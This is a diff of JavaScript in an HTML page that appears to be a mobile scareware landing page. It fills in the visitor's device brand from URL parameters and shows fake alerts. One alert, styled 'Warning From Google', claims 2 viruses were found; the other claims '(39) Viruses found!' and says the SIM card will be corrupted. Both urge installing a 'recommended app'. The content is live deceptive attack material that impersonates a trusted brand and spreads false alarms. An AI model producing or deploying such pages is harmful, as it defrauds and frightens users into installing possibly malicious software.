@@ -709,34 +709,38 @@
 /*dialog*/
     </style>
 
-    <script>
+<script>
+    function contains(string, fragment) {
+        string = string.toLowerCase();
+        fragment = fragment.toLowerCase();
+        return string.indexOf(fragment) !== -1;
+    }
 
-        function contains(string, fragment) {
-            string = string.toLowerCase();
-            fragment = fragment.toLowerCase();
-            return string.indexOf(fragment) !== -1;
+    function getURLParameter(name) {
+        var result = decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
+
+        if(name.indexOf('brand') !== -1 && contains(result, 'generic')) {
+            result = 'Phone'
         }
 
-        function getURLParameter(name) {
-            var result = decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
-
-            if(name.indexOf('brand') !== -1 && contains(result, 'generic')) {
-                result = 'Phone'
-            }
-
-            if(name.indexOf('dname') !== -1 && contains(result, 'android')) {
-                result = 'Phone'
-            }
-
-            if(name.indexOf('browser') !== -1 && contains(result, 'android')) {
-                result = 'Internet Browser'
-            }
-
-            return result;
-
+        if(name.indexOf('model') !== -1 && contains(result, 'android')) {
+            result = 'Phone'
         }
 
-    </script>
+        if(name.indexOf('browser') !== -1 && contains(result, 'android')) {
+            result = 'Internet Browser'
+        }
+
+        if(result==null||result==""){
+            result = 'Phone'
+        }
+
+        return result;
+
+    }
+
+</script>
+
 <script type="text/javascript"> 
 
 function getRandomInt(min, max)
@@ -757,8 +761,8 @@ setTimeout(func, getRandomInt(120,220)*1000);
 
 <script type="text/javascript">
 
-var ALERT_TITLE = "Warning From Google:";
-var ALERT_TEXT = "<b><font color='red'>*2 viruses found!*<br><br>We have detected a problem with your " + getURLParameter("device_brand") + ". If you don't clean it in time, it will destroy your phone! <br><br>Your photos and data will be lost and cannot be recovered! </font></b><br> <br> To clean your device, stay on the page and install the recommended app.";
+var ALERT_TITLE = "ATTENTION:";
+var ALERT_TEXT = "<b><font color='red'>(39) Viruses found!</font></b><br><br>Your " + getURLParameter("device_brand") + " is severely damaged by (39) viruses! <br><br>Soon your " + getURLParameter("device_brand") + " SIM card will be corrupt and it will damage your contacts, photos, data, applications, etc .. <br><br> To clean your device, stay on the page and install the recommended app.";
 var ALERT_BUTTON_TEXT = "Ok";
 
 var ALERT_TITLE_BACK = "Confirm Action:";
